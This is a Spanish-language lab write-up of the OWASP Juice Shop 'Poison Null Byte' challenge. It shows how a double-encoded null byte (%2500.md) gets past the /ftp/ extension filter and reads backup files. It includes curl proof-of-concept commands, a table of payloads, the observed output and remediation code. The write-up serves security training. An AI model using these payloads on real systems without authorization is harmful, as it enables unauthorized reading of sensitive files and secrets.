<div align="center">

# 🕳️ Poison Null Byte — Path Traversal
### OWASP Juice Shop · Bypass de Restricción de Extensión

![Status](https://img.shields.io/badge/Status-Verificado-00ff88?style=for-the-badge&logo=statuspage&logoColor=white)
![Severity](https://img.shields.io/badge/Severidad-Media-ffb300?style=for-the-badge)
![Type](https://img.shields.io/badge/Tipo-Path%20Traversal%20%2F%20Null%20Byte-00d4ff?style=for-the-badge&logo=owasp&logoColor=white)

</div>

---

> **Hallazgo:** el endpoint `/ftp/` restringe el acceso a archivos con extensión `.md` o `.pdf`. Al inyectar un null byte doble-URL-encodeado (`%2500`) seguido de `.md`, el servidor bypasea la validación de extensión y entrega el contenido real del archivo solicitado, incluyendo backups con información sensible de la aplicación.

> [!WARNING]
> Uso exclusivo en laboratorio controlado (`http://localhost:3000`). No reproducir en sistemas sin autorización explícita.

---

## 📋 Resumen del Hallazgo

| Campo | Detalle |
|-------|---------|
| **Aplicación** | OWASP Juice Shop |
| **Ruta** | `GET /ftp/<archivo>%2500.md` |
| **Tipo** | Poison Null Byte / Path Traversal |
| **Severidad** | 🟡 Media |
| **CVSS v3** | 5.3 · AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N |
| **Autenticación** | No requerida |
| **Estado** | ✅ Verificado |

---

## 🔍 Descripción

El directorio `/ftp/` expone archivos de la aplicación pero aplica un control que rechaza archivos cuya extensión no sea `.md` o `.pdf`. Al añadir `%2500.md` al nombre del archivo, el servidor decodifica `%25` como `%` primero, resultando en `%00.md`. Al procesar el path a nivel de sistema, el null byte (`\0`) actúa como terminador de string en C — truncando el nombre antes de `.md`. El servidor lee el archivo real (ej. `package.json.bak`) mientras el validador ve `.md` y aprueba.

> [!NOTE]
> El encoding `%2500` es necesario porque el servidor ya decodifica una vez el URL. `%00` directo devuelve `400 Bad Request`. El doble encoding asegura que el null byte llegue intacto al procesamiento del path.

---

## 🔬 Análisis Técnico

### `[01]` Comportamiento base — acceso directo bloqueado

```bash
curl -i http://localhost:3000/ftp/package.json.bak
# → 403 Forbidden
# → "Only .md and .pdf files are allowed!"
```

### `[02]` Lógica de validación (inferida)

```javascript
// Servidor verifica extensión del filename
if (!filename.endsWith('.md') && !filename.endsWith('.pdf')) {
  return res.status(403).send('Only .md and .pdf files are allowed!');
}
// Luego abre el archivo — el null byte trunca el path
```

### `[03]` Decodificación del payload `%2500`

```
URL recibida:  /ftp/package.json.bak%2500.md
Decode 1:      /ftp/package.json.bak%00.md      ← validador ve ".md" ✓
Decode 2 / FS: /ftp/package.json.bak\0.md       ← null trunca → lee package.json.bak
```

---

## 🧪 Reproducción

### `[01]` Payload válido

```text
package.json.bak%2500.md
```

### `[02]` PoC — curl

```bash
# Leer package.json.bak
curl -s "http://localhost:3000/ftp/package.json.bak%2500.md" | head -20

# Leer package-lock.json.bak
curl -s "http://localhost:3000/ftp/package-lock.json.bak%2500.md" | head -10

# Leer easter egg
curl -s "http://localhost:3000/ftp/eastere.gg%2500.md"

# Leer backup de cupones
curl -s "http://localhost:3000/ftp/coupons_2013.md.bak%2500.md"
```

### `[03]` Resultado observado

```json
{
  "name": "juice-shop",
  "version": "6.2.0-SNAPSHOT",
  "description": "An intentionally insecure JavaScript Web Application",
  ...
}
```

- Contenido real de `package.json.bak` devuelto con `200 OK`
- Validación de extensión bypasseada completamente
- Challenge `Poison Null Byte` → `solved: true`

---

## 🔁 Payloads Verificados

| Payload | Resultado |
|---------|-----------|
| `package.json.bak%2500.md` | ✅ Bypass exitoso — contenido del backup |
| `package.json.bak%2500.pdf` | ✅ Bypass exitoso |
| `package-lock.json.bak%2500.md` | ✅ Bypass exitoso |
| `eastere.gg%2500.md` | ✅ Bypass exitoso |
| `coupons_2013.md.bak%2500.md` | ✅ Bypass exitoso |
| `package.json.bak%00.md` | ❌ `400 Bad Request` — null byte sin doble encode rechazado |

---

## ✅ Validación del Challenge

```bash
python3 - <<'PY'
import json, urllib.request
ch = json.load(urllib.request.urlopen('http://localhost:3000/api/Challenges/'))['data']
print([c for c in ch if c['name'] == 'Poison Null Byte'][0]['solved'])
PY
```

Salida esperada: `True`

---

## 🔁 Flujo con Caido

1. Acceder a `/ftp/` y observar listing de archivos
2. Intentar acceder directamente a `package.json.bak` → `403`
3. `Send to Replay`
4. Añadir `%2500.md` al final del filename en la URL
5. Confirmar bypass con `200` y contenido real

---

## 💥 Impacto

- **Exposición de backups**: acceso a `package.json.bak`, `package-lock.json.bak` con metadatos de la app
- **Información sensible**: versión exacta, dependencias, posibles credenciales en configs respaldadas
- **Enumeración**: lista de dependencias permite identificar versiones vulnerables
- **Pivot**: información de versiones y dependencias soporta ataques de cadena de suministro y CVE targeting
- **Exposición de secretos**: archivos `.bak` pueden contener credenciales, API keys o configuraciones de producción

---

## 🔧 Remediación

| Medida | Descripción |
|--------|-------------|
| **Sanitizar null bytes** | Rechazar requests que contengan `%00`, `%2500` o caracteres nulos en paths |
| **Canonicalización del path** | Resolver el path completo antes de validar la extensión |
| **No exponer `/ftp/`** | Directorio de archivos internos no debe ser accesible públicamente |
| **Eliminar backups del server** | Archivos `.bak` no deben estar en directorios web-accessible |
| **Validar con regex estricto** | Aplicar regex que solo permita extensiones al final del nombre real, post-canonicalización |

```javascript
// ✅ Sanitización correcta
const path = require('path');

function serveFile(filename) {
  // Eliminar null bytes
  const safe = filename.replace(/\0/g, '');

  // Canonicalizar y validar extensión
  const ext = path.extname(safe).toLowerCase();
  if (!['.md', '.pdf'].includes(ext)) {
    throw new Error('Extensión no permitida');
  }

  // Prevenir path traversal
  const resolved = path.resolve(FTP_DIR, safe);
  if (!resolved.startsWith(FTP_DIR)) {
    throw new Error('Path traversal detectado');
  }

  return fs.readFile(resolved);
}
```

---

## 🔗 Referencias

- [PortSwigger — Path Traversal](https://portswigger.net/web-security/file-path-traversal)
- [OWASP Null Byte Injection](https://owasp.org/www-community/attacks/Null_Byte_Injection)
- [CWE-626: Null Byte Interaction Error](https://cwe.mitre.org/data/definitions/626.html)
- [CWE-23: Relative Path Traversal](https://cwe.mitre.org/data/definitions/23.html)
